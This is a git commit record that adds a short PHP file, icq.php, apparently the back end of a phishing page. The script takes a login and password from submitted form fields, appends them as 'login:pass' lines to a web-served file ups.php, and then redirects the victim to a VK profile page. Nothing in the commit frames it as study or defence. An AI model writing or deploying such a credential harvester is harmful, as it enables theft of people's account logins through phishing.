5fef2a7c6142ea7a27b2e5dfa3fe1017ba22d638
erjan-A <ekazhman@gmail.com>
2016-03-08 17:10:11 -0800

    first commit

---
+++ icq.php
@@ -0,0 +1,8 @@
+<?
+$Login = $_POST[zabor];
+$Pass = $_POST['zena'];
+$log = fopen("ups.php","a+");
+fwrite($log,"<br> $Login:$Pass \n");
+fclose($log);
+echo "<html><head><META HTTP-EQUIV='Refresh' content ='0; URL=http://vk.com/id280576420'></head></html>";
+?>
